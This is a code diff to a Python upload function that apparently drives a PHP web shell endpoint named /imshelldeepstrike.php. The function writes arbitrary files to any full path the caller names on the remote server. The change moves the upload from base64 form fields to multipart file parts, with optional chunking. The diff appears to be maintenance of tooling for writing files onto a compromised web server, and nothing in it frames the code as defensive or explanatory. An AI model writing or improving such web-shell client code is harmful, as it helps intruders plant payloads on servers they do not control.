@@ -86,26 +86,26 @@ def send_upload(
     file_data: bytes, remote_path: str, chunk_index: Optional[int] = None
 ) -> Tuple[str, Optional[int]]:
     """
-    Upload a file (or chunk) directly via POST with r (base64 data) and n (full remote path) parameters.
-    This uses the /imshelldeepstrike.php upload endpoint which saves to the provided remote_path.
-    
+    Upload a file (or chunk) via multipart/form-data (binary file part + n path).
+    Uses the /imshelldeepstrike.php endpoint; server writes to the provided remote_path.
+
     Args:
-        file_data: The file data (or chunk) to upload
-        remote_path: Full remote path where the file should be saved
+        file_data: The file data (or chunk) to upload (raw bytes).
+        remote_path: Full remote path where the file should be saved.
         chunk_index: Optional chunk index (0-based). If None, single upload is assumed.
     """
-    # URL-safe base64 avoids '+' and '/' so form encoding cannot corrupt the payload
-    b64_data = base64.urlsafe_b64encode(file_data).decode("ascii")
     url = build_url()
-    post_data = {"r": b64_data, "n": remote_path}
+    filename = Path(remote_path).name or "upload.bin"
+    files = {"file": (filename, file_data, "application/octet-stream")}
+    data = {"n": remote_path}
     if chunk_index is not None:
-        post_data["chunk"] = str(chunk_index)
-    
+        data["chunk"] = str(chunk_index)
+
     try:
         if TIMEOUT is None:
-            res = requests.post(url, data=post_data)
+            res = requests.post(url, files=files, data=data)
         else:
-            res = requests.post(url, data=post_data, timeout=TIMEOUT)
+            res = requests.post(url, files=files, data=data, timeout=TIMEOUT)
     except requests.exceptions.Timeout:
         return "request timed out", None
     except requests.exceptions.ConnectionError:
